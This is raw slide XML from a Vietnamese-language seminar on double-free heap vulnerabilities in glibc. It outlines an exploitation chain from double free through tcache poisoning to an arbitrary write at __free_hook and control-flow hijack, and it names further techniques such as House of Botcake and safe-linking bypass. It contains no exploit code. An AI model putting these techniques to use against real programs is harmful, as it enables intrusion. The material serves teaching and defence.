            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Metadata hijacking 2.42</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8791956" y="4800600"/>
            <a:ext cx="2756916" cy="130759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Struct có thể khởi tạo muộn; tràn/UAF trên chunk lớn phía trước ghi thẳng vào entries[]</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Biến thể hiện đại khác (ngoài trọng tâm double free)</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6.4 · CHỈ NÊU TÊN ĐỂ BIẾT HƯỚNG TRA CỨU TIẾP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="11274552" cy="1371600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5333"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1581912"/>
            <a:ext cx="1090879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KHI DOUBLE FREE ĐÃ BỊ CHẶN HOÀN TOÀN</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1874520"/>
            <a:ext cx="10908792" cy="804672"/>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Cần một primitive gốc khác (overflow, UAF do nguyên nhân khác) để vẫn làm hỏng được tcache — các kỹ thuật dưới không còn dựa trực tiếp vào free() kép, nằm ngoài trọng tâm "double free" của seminar này.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3017520"/>
            <a:ext cx="3605784" cy="1828800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="318211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BIẾN THỂ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="3474720"/>
            <a:ext cx="3240024" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>House of Botcake</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4023360"/>
            <a:ext cx="3240024" cy="71323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Consolidation với unsorted bin: chunk vừa nằm trong tcache vừa thuộc vùng free lớn hơn, ghi được vào vùng chồng lấn dù tcache đã chặn free trùng trực tiếp.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4291584" y="3017520"/>
            <a:ext cx="3605784" cy="1828800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4474464" y="318211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BIẾN THỂ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4474464" y="3474720"/>
            <a:ext cx="3240024" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Tcache stashing unlink attack</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4474464" y="4023360"/>
            <a:ext cx="3240024" cy="71323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Làm hỏng bk của smallbin trước khi glibc tự chuyển chunk sang tcache, khiến nó nhét một chunk giả vào tcache thay vì ghi next trực tiếp.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8125968" y="3017520"/>
            <a:ext cx="3605784" cy="1828800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8308848" y="318211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BIẾN THỂ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8308848" y="3474720"/>
            <a:ext cx="3240024" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Bypass safe-linking</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8308848" y="4023360"/>
            <a:ext cx="3240024" cy="71323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Leak heap base (đọc/in chunk tcache đã free, hoặc overlap/UAF khác) rồi tự mã hoá next theo công thức ở 6.1, thay vì ghi next trần.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="5074920"/>
            <a:ext cx="11274552" cy="1143000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6400"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="5239512"/>
            <a:ext cx="10908792" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Chi tiết: how2heap (shellphish) — mục Tài liệu tham khảo. Không phải phạm vi demo ở phần 05.</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Lỗ hổng · CWE · kỹ thuật · CVE liên hệ thế nào</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5 · CHUỖI KHAI THÁC</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="1956816" cy="1097280"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762"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Double free</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="2606040"/>
            <a:ext cx="1956816" cy="365760"/>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free() lần 2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2450592" y="1965960"/>
            <a:ext cx="301752" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2784348" y="1417320"/>
            <a:ext cx="1956816" cy="1097280"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762"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Alias hai con trỏ (UAF)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2784348" y="2606040"/>
            <a:ext cx="1956816" cy="365760"/>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malloc() trả 2 lần</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4777740" y="1965960"/>
            <a:ext cx="301752" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5111496" y="1417320"/>
            <a:ext cx="1956816" cy="1097280"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762"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Tcache poisoning</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5111496" y="2606040"/>
            <a:ext cx="1956816" cy="365760"/>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sửa next / key</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7104888" y="1965960"/>
            <a:ext cx="301752" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7438644" y="1417320"/>
            <a:ext cx="1956816" cy="1097280"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762"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Ghi tuỳ ý</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7438644" y="2606040"/>
            <a:ext cx="1956816" cy="365760"/>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chunk tại &amp;t, &amp;__free_hook</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9432036" y="1965960"/>
            <a:ext cx="301752" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9765792" y="1417320"/>
            <a:ext cx="1956816" cy="1097280"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent2"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762"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Chiếm luồng thực thi</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9765792" y="2606040"/>
            <a:ext cx="1956816" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>win(), system()</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3246120"/>
            <a:ext cx="2647188" cy="2971800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2763"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="341071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LỖ HỔNG (TRONG MÃ)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="3703320"/>
            <a:ext cx="2281428" cy="68580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Lỗi cụ thể</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4434840"/>
            <a:ext cx="2281428" cy="1673352"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>free()</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> hai lần cùng địa chỉ do quyền sở hữu vùng nhớ không rõ (5.2)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3332988" y="3246120"/>
            <a:ext cx="2647188" cy="2971800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2763"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3515868" y="341071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PHÂN LOẠI</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3515868" y="3703320"/>
            <a:ext cx="2281428" cy="68580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CWE-415</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3515868" y="4434840"/>
            <a:ext cx="2281428" cy="167335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Tên chung cho lớp lỗi; liên quan CWE-416 (UAF) và CWE-362 (race)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Shape 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="3246120"/>
            <a:ext cx="2647188" cy="2971800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2763"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="341071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KHAI THÁC</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
